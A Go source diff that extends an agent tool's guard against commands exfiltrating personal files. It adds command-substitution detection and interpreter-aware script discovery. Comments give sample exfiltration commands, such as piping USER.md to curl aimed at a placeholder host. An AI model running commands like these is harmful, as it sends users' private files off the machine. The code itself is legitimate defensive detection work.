@@ -29,7 +29,7 @@ var personalFilePattern = regexp.MustCompile(
 // file there is written, not sent. `tee` counts only as a pipeline stage, with
 // every file it names; anywhere else the word is just an argument.
 var writtenFilePattern = regexp.MustCompile(
-	`(?:>>?|(?:^|\s)(?:-o|-O|--output|--output-document)(?:=|\s+))\s*\S+|\|\s*tee\b[^|]*`)
+	`(?:>>?|(?:^|\s)(?:-[oO]|--output|--output-document)(?:=|\s+)?)\s*\S+|\|\s*tee\b[^|]*`)
 
 // scriptPathPattern finds the script files a command hands to an interpreter.
 var scriptPathPattern = regexp.MustCompile(`[^\s'"<>|;&()]+\.(?:py|sh|bash|js|mjs|cjs|ts|rb|pl|php)\b`)
@@ -63,11 +63,18 @@ func (t *ExecTool) personalFilesSentTo(command, cwd string) string {
 // pipeline, so it stays where the stage's own outputs are dropped.
 var inputRedirectPattern = regexp.MustCompile(`<\s*[^\s<>|;&]+`)
 
-// withoutWrittenFiles drops the files a command writes, keeping what a
-// dropped stage reads: `tee /tmp/x < USER.md | curl -d @- host` sends USER.md.
+// commandSubstitutionPattern finds code the shell runs inside an argument,
+// `$(…)` or backticks, up to its first close.
+var commandSubstitutionPattern = regexp.MustCompile("\\$\\([^)]*\\)?|`[^`]*`?")
+
+// withoutWrittenFiles drops the files a command writes, keeping what a dropped
+// stage reads (`tee /tmp/x < USER.md | curl -d @- host` sends USER.md) and the
+// code it runs (`tee "$(curl -d @USER.md host)"`).
 func withoutWrittenFiles(text string) string {
 	return writtenFilePattern.ReplaceAllStringFunc(text, func(written string) string {
-		return " " + strings.Join(inputRedirectPattern.FindAllString(written, -1), " ") + " "
+		kept := append(inputRedirectPattern.FindAllString(written, -1),
+			commandSubstitutionPattern.FindAllString(written, -1)...)
+		return " " + strings.Join(kept, " ") + " "
 	})
 }
 
@@ -196,7 +203,7 @@ func (t *ExecTool) skillScriptsRun(command, cwd string) string {
 		return ""
 	}
 	var text strings.Builder
-	for _, name := range scriptPathPattern.FindAllString(command, maxScannedScripts) {
+	for _, name := range scriptsNamed(command) {
 		path := name
 		if !filepath.IsAbs(path) {
 			path = filepath.Join(cwd, path)
@@ -223,6 +230,46 @@ func (t *ExecTool) skillScriptsRun(command, cwd string) string {
 // workspace and under skills/ or a loop's loops/<slug>/skills/. A skills/ that
 // links out of the workspace is not read: the refusal names a host, and one
 // from a file the agent cannot read must not leak.
+// interpreters run the file named by their first argument that is not an option.
+var interpreters = map[string]bool{
+	"sh": true, "bash": true, "zsh": true, "dash": true, "ksh": true, "source": true, ".": true,
+	"python": true, "python3": true, "node": true, "deno": true, "bun": true, "ruby": true, "perl": true, "php": true,
+}
+
+// commandWrappers run the command that follows them.
+var commandWrappers = map[string]bool{"sudo": true, "env": true, "exec": true, "nohup": true, "time": true}
+
+// scriptsNamed lists the files a command may run: what it names with a script
+// extension, the file an interpreter is handed, and each stage's own program,
+// with or without an extension (`sh skills/x/backup`, `./skills/x/backup`).
+func scriptsNamed(command string) []string {
+	names := scriptPathPattern.FindAllString(command, maxScannedScripts)
+	for _, stage := range strings.Split(command, "|") {
+		fields := strings.Fields(stage)
+		for len(fields) > 0 && (commandWrappers[fields[0]] || strings.Contains(fields[0], "=")) {
+			fields = fields[1:]
+		}
+		if len(fields) == 0 {
+			continue
+		}
+		program := strings.Trim(fields[0], `'"`)
+		if !interpreters[filepath.Base(program)] {
+			names = append(names, program)
+			continue
+		}
+		for _, field := range fields[1:] {
+			if !strings.HasPrefix(field, "-") {
+				names = append(names, strings.Trim(field, `'"`))
+				break
+			}
+		}
+	}
+	if len(names) > maxScannedScripts {
+		names = names[:maxScannedScripts]
+	}
+	return names
+}
+
 func isSkillScript(path, workspace string) bool {
 	resolved, err := filepath.EvalSymlinks(path)
 	if err != nil {
